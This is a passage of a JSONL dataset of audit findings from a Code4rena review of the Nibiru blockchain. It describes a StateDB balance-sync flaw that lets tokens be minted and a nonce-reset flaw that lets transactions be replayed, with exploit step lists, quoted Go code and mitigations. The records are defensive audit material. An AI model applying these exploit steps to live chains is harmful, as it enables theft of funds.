err)\n\t\t}\n\t}()\n\tif err := assertNotReadonlyTx(readOnly, method); err != nil {\n\t\treturn nil, err\n\t}\n\n\twasmContract, msgArgsBz, funds, err := p.parseArgsWasmExecute(args)\n\tif err != nil {\n\t\terr = ErrInvalidArgs(err)\n\t\treturn\n\t}\n\tdata, err := p.Wasm.Execute(ctx, wasmContract, eth.EthAddrToNibiruAddr(caller), msgArgsBz, funds)\n\tif err != nil {\n\t\treturn\n\t}\n\treturn method.Outputs.Pack(data)\n}\n```\n\n### Exploit Steps\n* Create a Wasm contract to perform staking-related operations and fund it with `X` Nibi.\n* Create an EVM contract to interact with the Wasm contract.\n* In the EVM contract:\n    * Transfer dust amount to the wasm so that the account is retrieved and added to the statedb's stateObjects\n    * Instruct the wasm contract to delegate `Y` Nibi\n* When delegate reduces the wasm balance from `X` to `X-Y`. EVM would still believe the balance is `X` and `SetAccBalance` would increase the balance from `X-Y` to `X` by minting `Y`.\n* The attacker can call the wasm contract to undelegate the delegated `Y` Nibi... Or attack several times to take over the chain.\n\n\n## Recommended mitigation steps\nMake sure EVM statedb is synced for every action that changes bank balances, preferably from `setBalance`.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go#L80-L91\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/statedb.go#L72-L103\n\n\n# Vulnerability details\n\n## Finding description and impact\n\n`NibiruBankKeeper.SyncStateDBWithAccount` function in [bank_extension.go](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/bank_extension.go#L80C1-L91C2) is responsible for synchronizing the EVM state database (`StateDB`) with the corresponding bank account balance whenever the balance is updated. However, this function is not invoked by all operations that modify bank balances.\n\n```go\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(\n\tctx sdk.Context, acc sdk.AccAddress,\n) {\n\t// If there's no StateDB set, it means we're not in an EthereumTx.\n\tif bk.StateDB == nil {\n\t\treturn\n\t}\n\tbalanceWei := evm.NativeToWei(\n\t\tbk.GetBalance(ctx, acc, evm.EVMBankDenom).Amount.BigInt(),\n\t)\n\tbk.StateDB.SetBalanceWei(eth.NibiruAddrToEthAddr(acc), balanceWei)\n}\n```\n\nThe following functions call [bankKeeper.setBalance](https://github.com/NibiruChain/cosmos-sdk/blob/v0.47.11-nibiru.2/x/bank/keeper/send.go#L337), but some do not trigger SyncStateDBWithAccount:\n\n* bankKeeper.addCoins\n    * bankKeeper.SendCoins ( Synced)\n        * bankMsgServer.Send\n        * bankKeeper.SendCoinsFromModuleToAccount ( Synced)\n        * bankKeeper.SendCoinsFromModuleToModule ( Synced)\n        * bankKeeper.SendCoinsFromAccountToModule ( Synced)\n    * bankKeeper.InputOutputCoins ( Not Synced)\n        * bankMsgServer.MultiSend\n    * bankKeeper.DelegateCoins ( Not Synced)\n    * bankKeeper.UndelegateCoins ( Not Synced)\n    * bankKeeper.MintCoins ( Synced)\n* bankKeeper.subUnlockedCoins\n    * bankKeeper.SendCoins ( Synced)\n    * bankKeeper.InputOutputCoins ( Not Synced)\n    * bankKeeper.UndelegateCoins ( Not Synced)\n    * bankKeeper.BurnCoins ( Synced)\n* bankKeeper.DelegateCoins ( Not Synced)\n    * bankKeeper.DelegateCoinsFromAccountToModule\n        * stakingKeeper.Delegate\n            * stakingMsgServer.CreateValidator\n            * stakingMsgServer.Delegate\n            * stakingMsgServer.CancelUnbondingDelegation\n            * stakingKeeper.BeginRedelegation\n                * stakingMsgServer.BeginRedelegate\n\nThe EVM can mint or burn an arbitrary amount of Nibi tokens when the `obj.Account.BalanceWei` in the StateDB is out of sync. Specifically, the EVM's [SetAccBalance](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/statedb.go#L72-L98) function allows this discrepancy to occur if balances are updated outside of the SyncStateDBWithAccount mechanism.\n\n\n## Proof of Concept\nThe `bankKeeper.DelegateCoins` function illustrates this vulnerability. It would reduce the balance of delegator address and increase the balance [BondedPoolName or NotBondedPoolName](https://github.com/NibiruChain/cosmos-sdk/blob/v0.47.11-nibiru.2/x/staking/keeper/delegation.go#L672-L680) module address. And this could be triggered because\n* stakingMsgServer can reach it with Delegate -> stakingKeeper.Delegate -> bankKeeper.DelegateCoinsFromAccountToModule -> bankKeeper.DelegateCoins\n* stakingMsgServer can be triggered by wasm contracts ([reference1](https://github.com/code-423n4/2024-11-nibiru/blob/main/app/keepers.go#L462-L465)    |    [reference2](https://github.com/NibiruChain/wasmd/blob/v0.44.0-nibiru/app/wasm.go#L9))\n* wasm contracts can be triggered by evm contracts ([ref](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L118C1-L162C2))\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/app/keepers.go#L462-L465\n```go\nsupportedFeatures := strings.Join(wasmdapp.AllCapabilities(), \",\")\n\n// Create wasm VM outside keeper so it can be re-used in client keeper\nwasmVM, err := wasmvm.NewVM(filepath.Join(wasmDir, \"wasm\"), supportedFeatures, wasmVmContractMemoryLimit, wasmConfig.ContractDebugMode, wasmConfig.MemoryCacheSize)\n```\n\nhttps://github.com/NibiruChain/wasmd/blob/v0.44.0-nibiru/app/wasm.go#L9\n```go\nfunc AllCapabilities() []string {\n\treturn []string{\n\t\t\"iterator\",\n\t\t\"staking\",\n\t\t\"stargate\",\n\t\t\"cosmwasm_1_1\",\n\t\t\"cosmwasm_1_2\",\n\t\t\"cosmwasm_1_3\",\n\t\t\"cosmwasm_1_4\",\n\t}\n}\n```\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L118C1-L162C2\n```go\n// execute invokes a Wasm contract's \"ExecuteMsg\", which corresponds to\n// \"wasm/types/MsgExecuteContract\". This enables arbitrary smart contract\n// execution using the Wasm VM from the EVM.\n//\n// Implements \"execute\" from evm/embeds/contracts/Wasm.sol:\n//\n//\t```solidity\n//\t function execute(\n//\t   string memory contractAddr,\n//\t   bytes memory msgArgs,\n//\t   BankCoin[] memory funds\n//\t ) payable external returns (bytes memory response);\n//\t```\n//\n// Contract Args:\n//   - contractAddr: nibi-prefixed Bech32 address of the wasm contract\n//   - msgArgs: JSON encoded wasm execute invocation\n//   - funds: Optional funds to supply during the execute call. It's\n//     uncommon to use this field, so you'll pass an empty array most of the time.\nfunc (p precompileWasm) execute(\n\tstart OnRunStartResult,\n\tcaller gethcommon.Address,\n\treadOnly bool,\n) (bz []byte, err error) {\n\tmethod, args, ctx := start.Method, start.Args, start.CacheCtx\n\tdefer func() {\n\t\tif err != nil {\n\t\t\terr = ErrMethodCalled(method, err)\n\t\t}\n\t}()\n\tif err := assertNotReadonlyTx(readOnly, method); err != nil {\n\t\treturn nil, err\n\t}\n\n\twasmContract, msgArgsBz, funds, err := p.parseArgsWasmExecute(args)\n\tif err != nil {\n\t\terr = ErrInvalidArgs(err)\n\t\treturn\n\t}\n\tdata, err := p.Wasm.Execute(ctx, wasmContract, eth.EthAddrToNibiruAddr(caller), msgArgsBz, funds)\n\tif err != nil {\n\t\treturn\n\t}\n\treturn method.Outputs.Pack(data)\n}\n```\n\n### Exploit Steps\n* Create a Wasm contract to perform staking-related operations and fund it with `X` Nibi.\n* Create an EVM contract to interact with the Wasm contract.\n* In the EVM contract:\n    * Transfer dust amount to the wasm so that the account is retrieved and added to the statedb's stateObjects\n    * Instruct the wasm contract to delegate `Y` Nibi\n* When delegate reduces the wasm balance from `X` to `X-Y`. EVM would still believe the balance is `X` and `SetAccBalance` would increase the balance from `X-Y` to `X` by minting `Y`.\n* The attacker can call the wasm contract to undelegate the delegated `Y` Nibi... Or attack several times to take over the chain.\n\n\n## Recommended mitigation steps\nMake sure EVM statedb is synced for every action that changes bank balances, preferably from `setBalance`.\n"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-029", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 29, "page_start": null, "title": "Nonce can be manipulated by inserting a contract creation EthereumTx message first in an SDK TX with multiple EthereumTX messages", "short_summary": null, "description_md": "## Finding description and impact\nThe Ante handler for `MsgEthereumTx` transactions is responsible for ensuring messages are coming with correct nonces. After doing so, it'll increment the account's sequences for each message that the account has signed and broadcasted.\n\nThe problem is that when the `EthereumTx()` message server method calls `ApplyEvmMsg()` it'll override the account nonce when the currently processed EVM transaction message is a contract creation and will set it to the nonce of the message. When a non-contract creation EVM transaction message is processed, however, the `ApplyEvmMsg()` method does **not** touch the account's nonce.\n\nThis opens up an exploit window where a malicious user can replay a TX multiple times and reuse their nonces. Users can manipulate their Sequence (nonce) by submitting a contract creation EVM transaction message and multiple call/transfer EVM transaction messages in a single SDK transaction.\n\nThe code relies on `evmObj.Call()` and later `stateDB.commitCtx()` to persist a correct nonce in state but the `Call()` method on `evmObj` does **not** handle account nonces, it just executes the transaction. As we can see the method in `geth` that's normally used to transition the state increments the sender's nonce by 1 in either case:\n\nhttps://github.com/NibiruChain/go-ethereum/blob/nibiru/geth/core/state_transition.go#L331-L337\n```go\n\tif contractCreation {\n\t\tret, _, st.gas, vmerr = st.evm.Create(sender, st.data, st.gas, st.value)\n\t} else {\n\t\t// Increment the nonce for the next transaction\n\t\tst.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+1)\n\t\tret, st.gas, vmerr = st.evm.Call(sender, st.to(), st.data, st.gas, st.value)\n\t}\n```\nhttps://github.com/NibiruChain/go-ethereum/blob/nibiru/geth/core/vm/evm.go#L498-L501\n```go\nfunc (evm *EVM) Create(caller ContractRef, code []byte, gas uint64, value *big.Int) (ret []byte, contractAddr common.Address, leftOverGas uint64, err error) {\n\tcontractAddr = crypto.CreateAddress(caller.Address(), evm.StateDB.GetNonce(caller.Address()))\n\treturn evm.create(caller, &codeAndHash{code: code}, gas, value, contractAddr, CREATE)\n}\n```\nhttps://github.com/NibiruChain/go-ethereum/blob/7fb652f186b09b81cce9977408e1aff744f4e3ef/core/vm/evm.go#L405-L418\n```go\nfunc (evm *EVM) create(caller ContractRef, codeAndHash *codeAndHash, gas uint64, value *big.Int, address common.Address, typ OpCode) ([]byte, common.Address, uint64, error) {\n\t// Depth check execution. Fail if we're trying to execute above the\n\t// limit.\n\tif evm.depth > int(params.CallCreateDepth) {\n\t\treturn nil, common.Address{}, gas, ErrDepth\n\t}\n\tif !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) {\n\t\treturn nil, common.Address{}, gas, ErrInsufficientBalance\n\t}\n\tnonce := evm.StateDB.GetNonce(caller.Address())\n\tif nonce+1 < nonce {\n\t\treturn nil, common.Address{}, gas, ErrNonceUintOverflow\n\t}\n\tevm.StateDB.SetNonce(caller.Address(), nonce+1)\n```\n\nBut `ApplyEvmMsg()` calls `evmObj.Call()` (`st.evm.Call()` in the above code snippet) directly and does not increment sender's nonce:\n```go\n\tif contractCreation {\n\t\t// take over the nonce management from evm:\n\t\t// - reset sender's nonce to msg.Nonce() before calling evm.\n\t\t// - increase sender's nonce by one no matter the result.\n\t\tstateDB.SetNonce(sender.Address(), msg.Nonce())\n\t\tret, _, leftoverGas, vmErr = evmObj.Create(\n\t\t\tsender,\n\t\t\tmsg.Data(),\n\t\t\tleftoverGas,\n\t\t\tmsgWei,\n\t\t)\n\t\tstateDB.SetNonce(sender.Address(), msg.Nonce()+1)\n\t} else {\n\t\tret, leftoverGas, vmErr = evmObj.Call(\n\t\t\tsender,\n\t\t\t*msg.To(),\n\t\t\tmsg.Data(),\n\t\t\tleftoverGas,\n\t\t\tmsgWei,\n\t\t)\n\t}\n```\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/msg_server.go#L330\n\n\n# Vulnerability details\n\n## Finding description and impact\nThe Ante handler for `MsgEthereumTx` transactions is responsible for ensuring messages are coming with correct nonces. After doing so, it'll increment the account's sequences for each message that the account has signed and broadcasted.\n\nThe problem is that when the `EthereumTx()` message server method calls `ApplyEvmMsg()` it'll override the account nonce when the currently processed EVM transaction message is a contract creation and will set it to the nonce of the message. When a non-contract creation EVM transaction message is processed, however, the `ApplyEvmMsg()` method does **not** touch the account's nonce.\n\nThis opens up an exploit window where a malicious user can replay a TX multiple times and reuse their nonces. Users can manipulate their Sequence (nonce) by submitting a contract creation EVM transaction message and multiple call/transfer EVM transaction messages in a single SDK transaction.\n\nThe code relies on `evmObj.Call()` and later `stateDB.commitCtx()` to persist a correct nonce in state but the `Call()` method on `evmObj` does **not** handle account nonces, it just executes the transaction. As we can see the method in `geth` that's normally used to transition the state increments the sender's nonce by 1 in either case:\n\nhttps://github.com/NibiruChain/go-ethereum/blob/nibiru/geth/core/state_transition.go#L331-L337\n```go\n\tif contractCreation {\n\t\tret, _, st.gas, vmerr = st.evm.Create(sender, st.data, st.gas, st.value)\n\t} else {\n\t\t// Increment the nonce for the next transaction\n\t\tst.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+1)\n\t\tret, st.gas, vmerr = st.evm.Call(sender, st.to(), st.data, st.gas, st.value)\n\t}\n```\nhttps://github.com/NibiruChain/go-ethereum/blob/nibiru/geth/core/vm/evm.go#L498-L501\n```go\nfunc (evm *EVM) Create(caller ContractRef, code []byte, gas uint64, value *big.Int) (ret []byte, contractAddr common.Address, leftOverGas uint64, err error) {\n\tcontractAddr = crypto.CreateAddress(caller.Address(), evm.StateDB.GetNonce(caller.Address()))\n\treturn evm.create(caller, &codeAndHash{code: code}, gas, value, contractAddr, CREATE)\n}\n```\nhttps://github.com/NibiruChain/go-ethereum/blob/7fb652f186b09b81cce9977408e1aff744f4e3ef/core/vm/evm.go#L405-L418\n```go\nfunc (evm *EVM) create(caller ContractRef, codeAndHash *codeAndHash, gas uint64, value *big.Int, address common.Address, typ OpCode) ([]byte, common.Address, uint64, error) {\n\t// Depth check execution. Fail if we're trying to execute above the\n\t// limit.\n\tif evm.depth > int(params.CallCreateDepth) {\n\t\treturn nil, common.Address{}, gas, ErrDepth\n\t}\n\tif !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) {\n\t\treturn nil, common.Address{}, gas, ErrInsufficientBalance\n\t}\n\tnonce := evm.StateDB.GetNonce(caller.Address())\n\tif nonce+1 < nonce {\n\t\treturn nil, common.Address{}, gas, ErrNonceUintOverflow\n\t}\n\tevm.StateDB.SetNonce(caller.Address(), nonce+1)\n```\n\nBut `ApplyEvmMsg()` calls `evmObj.Call()` (`st.evm.Call()` in the above code snippet) directly and does not increment sender's nonce:\n```go\n\tif contractCreation {\n\t\t// take over the nonce management from evm:\n\t\t// - reset sender's nonce to msg.Nonce() before calling evm.\n\t\t// - increase sender's nonce by one no matter the result.\n\t\tstateDB.SetNonce(sender.Address(), msg.Nonce())\n\t\tret, _, leftoverGas, vmErr = evmObj.Create(\n\t\t\tsender,\n\t\t\tmsg.Data(),\n\t\t\tleftoverGas,\n\t\t\tmsgWei,\n\t\t)\n\t\tstateDB.SetNonce(sender.Address(), msg.Nonce()+1)\n\t} else {\n\t\tret, leftoverGas, vmErr = evmObj.Call(\n\t\t\tsender,\n\t\t\t*msg.To(),\n\t\t\tmsg.Data(),\n\t\t\tleftoverGas,\n\t\t\tmsgWei,\n\t\t)\n\t}\n```\n## Proof of Concept\n1. User constructs an **SDK** transaction with 4 `MsgEthereumTx` messages in it.\n2. The first message is an **EVM** transaction that creates a new contract and has a nonce 1.\n3. The next three messages are also **EVM** transactions that transfer ether (unibi as its the native unit of account in Nibiru's EVM) or just call some contracts.\n4. The three messages have nonces of 2, 3 and 4.\n5. The user broadcasts the **SDK** transaction. It passes validation through the Ante handler and is included in the mempool.\n6. The TX is picked up to be processed by the `DeliverTx()` method and the Ante handler is called again.\n7. The Ante handler increments the `MsgEthereumTx` message sender's sequence (nonce) for each **EVM** transaction message.\n8. User's sequence (nonce) in their SDK `x/auth` account is currently 5 (the next consecutive ready-for-use nonce).\n9. `ApplyEvmMsg()` is called to process the first **EVM** transaction message and since it's a contract creation transaction it sets the sender's sequence (nonce) to `msg.Nonce() + 1`. After running the transaction through the geth interpreter, the account `stateObject` properties (like nonce, code hash and account state) are persisted to the `x/evm` module keeper's storage by calling `stateDB.Commit()`. The user account's `Sequence` is now reset to `msg.Nonce() + 1` (equal to 2).\n10. The remaining three messages with nonces (2, 3, and 4) are then executed but the user's sequence (nonce) is still at `2`.\n11. User can now replay their last three messages.\n\n\n| SDK TX Message # | Contract creation | Message nonce | Account sequence set by ante handler | Account sequence after execution                |\n| ---------------- | ----------------- | ------------- | ------------------------------------ | ----------------------------------------------- |\n| 1                | true              | 1             | 1                                    | 1 (set by `ApplyEvmMsg()`)                      |\n| 2                | false             | 2             | 2                                    | 1 (not updated as `contractCreation == false` ) |\n| 3                | false             | 3             | 3                                    | 1                                               |\n| 4                | false             | 4             | 4                                    | 1                                               |\n## Recommended mitigation steps\nSet the sender's nonce to `msg.Nonce() + 1` when `contractCreation` is `false`.\n", "sections": {"description_md": "## Finding description and impact\nThe Ante handler for `MsgEthereumTx` transactions is responsible for ensuring messages are coming with correct nonces. After doing so, it'll increment the account's sequences for each message that the account has signed and broadcasted.\n\nThe problem is that when the `EthereumTx()` message server method calls `ApplyEvmMsg()` it'll override the account nonce when the currently processed EVM transaction message is a contract creation and will set it to the nonce of the message. When a non-contract creation EVM transaction message is processed, however, the `ApplyEvmMsg()` method does **not** touch the account's nonce.\n\nThis opens up an exploit window where a malicious user can replay a TX multiple times and reuse their nonces. Users can manipulate their Sequence (nonce) by submitting a contract creation EVM transaction message and multiple call/transfer EVM transaction messages in a single SDK transaction.\n\nThe code relies on `evmObj.Call()` and later `stateDB.commitCtx()` to persist a correct nonce in state but the `Call()` method on `evmObj` does **not** handle account nonces, it just executes the transaction. As we can see the method in `geth` that's normally used to transition the state increments the sender's nonce by 1 in either case:\n\nhttps://github.com/NibiruChain/go-ethereum/blob/nibiru/geth/core/state_transition.go#L331-L337\n```go\n\tif contractCreation {\n\t\tret, _, st.gas, vmerr = st.evm.Create(sender, st.data, st.gas, st.value)\n\t} else {\n\t\t// Increment the nonce for the next transaction\n\t\tst.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+1)\n\t\tret, st.gas, vmerr = st.evm.Call(sender, st.to(), st.data, st.gas, st.value)\n\t}\n```\nhttps://github.com/NibiruChain/go-ethereum/blob/nibiru/geth/core/vm/evm.go#L498-L501\n```go\nfunc (evm *EVM) Create(caller ContractRef, code []byte, gas uint64, value *big.Int) (ret []byte, contractAddr common.Address, leftOverGas uint64, err error) {\n\tcontractAddr = crypto.CreateAddress(caller.Address(), evm.StateDB.GetNonce(caller.Address()))\n\treturn evm.create(caller, &codeAndHash{code: code}, gas, value, contractAddr, CREATE)\n}\n```\nhttps://github.com/NibiruChain/go-ethereum/blob/7fb652f186b09b81cce9977408e1aff744f4e3ef/core/vm/evm.go#L405-L418\n```go\nfunc (evm *EVM) create(caller ContractRef, codeAndHash *codeAndHash, gas uint64, value *big.Int, address common.Address, typ OpCode) ([]byte, common.Address, uint64, error) {\n\t// Depth check execution. Fail if we're trying to execute above the\n\t// limit.\n\tif evm.depth > int(params.CallCreateDepth) {\n\t\treturn nil, common.Address{}, gas, ErrDepth\n\t}\n\tif !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) {\n\t\treturn nil, common.Address{}, gas, ErrInsufficientBalance\n\t}\n\tnonce := evm.StateDB.GetNonce(caller.Address())\n\tif nonce+1 < nonce {\n\t\treturn nil, common.Address{}, gas, ErrNonceUintOverflow\n\t}\n\tevm.StateDB.SetNonce(caller.Address(), nonce+1)\n```\n\nBut `ApplyEvmMsg()` calls `evmObj.Call()` (`st.evm.Call()` in the above code snippet) directly and does not increment sender's nonce:\n```go\n\tif contractCreation {\n\t\t// take over the nonce management from evm:\n\t\t// - reset sender's nonce to msg.Nonce() before calling evm.\n\t\t// - increase sender's nonce by one no matter the result.\n\t\tstateDB.SetNonce(sender.Address(), msg.Nonce())\n\t\tret, _, leftoverGas, vmErr = evmObj.Create(\n\t\t\tsender,\n\t\t\tmsg.Data(),\n\t\t\tleftoverGas,\n\t\t\tmsgWei,\n\t\t)\n\t\tstateDB.SetNonce(sender.Address(), msg.Nonce()+1)\n\t} else {\n\t\tret, leftoverGas, vmErr = evmObj.Call(\n\t\t\tsender,\n\t\t\t*msg.To(),\n\t\t\tmsg.Data(),\n\t\t\tleftoverGas,\n\t\t\tmsgWei,\n\t\t)\n\t}\n```\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\nSet the sender's nonce to `msg.Nonce() + 1` when `contractCreation` is `false`.\n", "poc_md": "## Proof of Concept\n1. User constructs an **SDK** transaction with 4 `MsgEthereumTx` messages in it.\n2. The first message is an **EVM** transaction that creates a new contract and has a nonce 1.\n3. The next three messages are also **EVM** transactions that transfer ether (unibi as its the native unit of account in Nibiru's EVM) or just call some contracts.\n4. The three messages have nonces of 2, 3 and 4.\n5. The user broadcasts the **SDK** transaction. It passes validation through the Ante handler and is included in the mempool.\n6. The TX is picked up to be processed by the `DeliverTx()` method and the Ante handler is called again.\n7. The Ante handler increments the `MsgEthereumTx` message sender's sequence (nonce) for each **EVM** transaction message.\n8. User's sequence (nonce) in their SDK `x/auth` account is currently 5 (the next consecutive ready-for-use nonce).\n9. `ApplyEvmMsg()` is called to process the first **EVM** transaction message and since it's a contract creation transaction it sets the sender's sequence (nonce) to `msg.Nonce() + 1`. After running the transaction through the geth interpreter, the account `stateObject` properties (like nonce, code hash and account state) are persisted to the `x/evm` module keeper's storage by calling `stateDB.Commit()`. The user account's `Sequence` is now reset to `msg.Nonce() + 1` (equal to 2).\n10. The remaining three messages with nonces (2, 3, and 4) are then executed but the user's sequence (nonce) is still at `2`.\n11. User can now replay their last three messages.\n\n\n| SDK TX Message # | Contract creation | Message nonce | Account sequence set by ante handler | Account sequence after execution                |\n| ---------------- | ----------------- | ------------- | ------------------------------------ | ----------------------------------------------- |\n| 1                | true              | 1             | 1                                    | 1 (set by `ApplyEvmMsg()`)                      |\n| 2                | false             | 2             | 2                                    | 1 (not updated as `contractCreation == false` ) |\n| 3                | false             | 3             | 3                                    | 1                                               |\n| 4                | false             | 4             | 4                                    | 1                                               |\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/msg_server.go#L330\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/msg_server.go#L330\n\n\n# Vulnerability details\n\n## Finding description and impact\nThe Ante handler for `MsgEthereumTx` transactions is responsible for ensuring messages are coming with correct nonces. After doing so, it'll increment the account's sequences for each message that the account has signed and broadcasted.\n\nThe problem is that when the `EthereumTx()` message server method calls `ApplyEvmMsg()` it'll override the account nonce when the currently processed EVM transaction message is a contract creation and will set it to the nonce of the message. When a non-contract creation EVM transaction message is processed, however, the `ApplyEvmMsg()` method does **not** touch the account's nonce.\n\nThis opens up an exploit window where a malicious user can replay a TX multiple times and reuse their nonces. Users can manipulate their Sequence (nonce) by submitting a contract creation EVM transaction message and multiple call/transfer EVM transaction messages in a single SDK transaction.\n\nThe code relies on `evmObj.Call()` and later `stateDB.commitCtx()` to persist a correct nonce in state but the `Call()` method on `evmObj` does **not** handle account nonces, it just executes the transaction. As we can see the method in `geth` that's normally used to transition the state increments the sender's nonce by 1 in either case:\n\nhttps://github.com/NibiruChain/go-ethereum/blob/nibiru/geth/core/state_transition.go#L331-L337\n```go\n\tif contractCreation {\n\t\tret, _, st.gas, vmerr = st.evm.Create(sender, st.data, st.gas, st.value)\n\t} else {\n\t\t// Increment the nonce for the next transaction\n\t\tst.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+1)\n\t\tret, st.gas, vmerr = st.evm.Call(sender, st.to(), st.data, st.gas, st.value)\n\t}\n```\nhttps://github.com/NibiruChain/go-ethereum/blob/nibiru/geth/core/vm/evm.go#L498-L501\n```go\nfunc (evm *EVM) Create(caller ContractRef, code []byte, gas uint64, value *big.Int) (ret []byte, contractAddr common.Address, leftOverGas uint64, err error) {\n\tcontractAddr = crypto.CreateAddress(caller.Address(), evm.StateDB.GetNonce(caller.Address()))\n\treturn evm.create(caller, &codeAndHash{code: code}, gas, value, contractAddr, CREATE)\n}\n```\nhttps://github.com/NibiruChain/go-ethereum/blob/7fb652f186b09b81cce9977408e1aff744f4e3ef/core/vm/evm.go#L405-L418\n```go\nfunc (evm *EVM) create(caller ContractRef, codeAndHash *codeAndHash, gas uint64, value *big.Int, address common.Address, typ OpCode) ([]byte, common.Address, uint64, error) {\n\t// Depth check execution. Fail if we're trying to execute above the\n\t// limit.\n\tif evm.depth > int(params.CallCreateDepth) {\n\t\treturn nil, common.Address{}, gas, ErrDepth\n\t}\n\tif !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) {\n\t\treturn nil, common.Address{}, gas, ErrInsufficientBalance\n\t}\n\tnonce := evm.StateDB.GetNonce(caller.Address())\n\tif nonce+1 < nonce {\n\t\treturn nil, common.Address{}, gas, ErrNonceUintOverflow\n\t}\n\tevm.StateDB.SetNonce(caller.Address(), nonce+1)\n```\n\nBut `ApplyEvmMsg()` calls `evmObj.Call()` (`st.evm.Call()` in the above code snippet) directly and does not increment sender's nonce:\n```go\n\tif contractCreation {\n\t\t// take over the nonce management from evm:\n\t\t// - reset sender's nonce to msg.Nonce() before calling evm.\n\t\t// - increase sender's nonce by one no matter the result.\n\t\tstateDB.SetNonce(sender.Address(), msg.Nonce())\n\t\tret, _, leftoverGas, vmErr = evmObj.Create(\n\t\t\tsender,\n\t\t\tmsg.Data(),\n\t\t\tleftoverGas,\n\t\t\tmsgWei,\n\t\t)\n\t\tstateDB.SetNonce(sender.Address(), msg.Nonce()+1)\n\t} else {\n\t\tret, leftoverGas, vmErr = evmObj.Call(\n\t\t\tsender,\n\t\t\t*msg.To(),\n\t\t\tmsg.Data(),\n\t\t\tleftoverGas,\n\t\t\tmsgWei,\n\t\t)\n\t}\n```\n## Proof of Concept\n1. User constructs an **SDK** transaction with 4 `MsgEthereumTx` messages in it.\n2. The first message is an **EVM** transaction that creates a new contract and has a nonce 1.\n3. The next three messages are also **EVM** transactions that transfer ether (unibi as its the native unit of account in Nibiru's EVM) or just call some contracts.\n4. The three messages have nonces of 2, 3 and 4.\n5. The user broadcasts the **SDK** transaction. It passes validation through the Ante handler and is included in the mempool.\n6. The TX is picked up to be processed by the `DeliverTx()` method and the Ante handler is called again.\n7. The Ante handler increments the `MsgEthereumTx` message sender's sequence (nonce) for each **EVM** transaction message.\n8. User's sequence (nonce) in their SDK `x/auth` account is currently 5 (the next consecutive ready-for-use nonce).\n9. `ApplyEvmMsg()` is called to process the first **EVM** transaction message and since it's a contract creation transaction it sets the sender's sequence (nonce) to `msg.Nonce() + 1`. After running the transaction through the geth interpreter, the account `stateObject` properties (like nonce, code hash and account state) are persisted to the `x/evm` module keeper's storage by calling `stateDB.Commit()`. The user account's `Sequence` is now reset to `msg.Nonce() + 1` (equal to 2).\n10. The remaining three messages with nonces (2, 3, and 4) are then executed but the user's sequence (nonce) is still at `2`.\n11. User can now replay their last three messages.\n\n\n| SDK TX Message # | Contract creation | Message nonce | Account sequence set by ante handler | Account sequence after execution                |\n| ---------------- | ----------------- | ------------- | ------------------------------------ | ----------------------------------------------- |\n| 1                | true              | 1             | 1                                    | 1 (set by `ApplyEvmMsg()`)                      |\n| 2                | false             | 2             | 2                                    | 1 (not updated as `contractCreation == false` ) |\n| 3                | false             | 3             | 3                                    | 1                                               |\n| 4                | false             | 4             | 4                                    | 1                                               |\n## Recommended mitigation steps\nSet the sender's nonce to `msg.Nonce() + 1` when `contractCreation` is `false`.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/msg_server.go#L330\n\n\n# Vulnerability details\n\n## Finding description and impact\nThe Ante handler for `MsgEthereumTx` transactions is responsible for ensuring messages are coming with correct nonces. After doing so, it'll increment the account's sequences for each message that the account has signed and broadcasted.\n\nThe problem is that when the `EthereumTx()` message server method calls `ApplyEvmMsg()` it'll override the account nonce when the currently processed EVM transaction message is a contract creation and will set it to the nonce of the message. When a non-contract creation EVM transaction message is processed, however, the `ApplyEvmMsg()` method does **not** touch the account's nonce.\n\nThis opens up an exploit window where a malicious user can replay a TX multiple times and reuse their nonces. Users can manipulate their Sequence (nonce) by submitting a contract creation EVM transaction message and multiple call/transfer EVM transaction messages in a single SDK transaction.\n\nThe code relies on `evmObj.Call()` and later `stateDB.commitCtx()` to persist a correct nonce in state but the `Call()` method on `evmObj` does **not** handle account nonces, 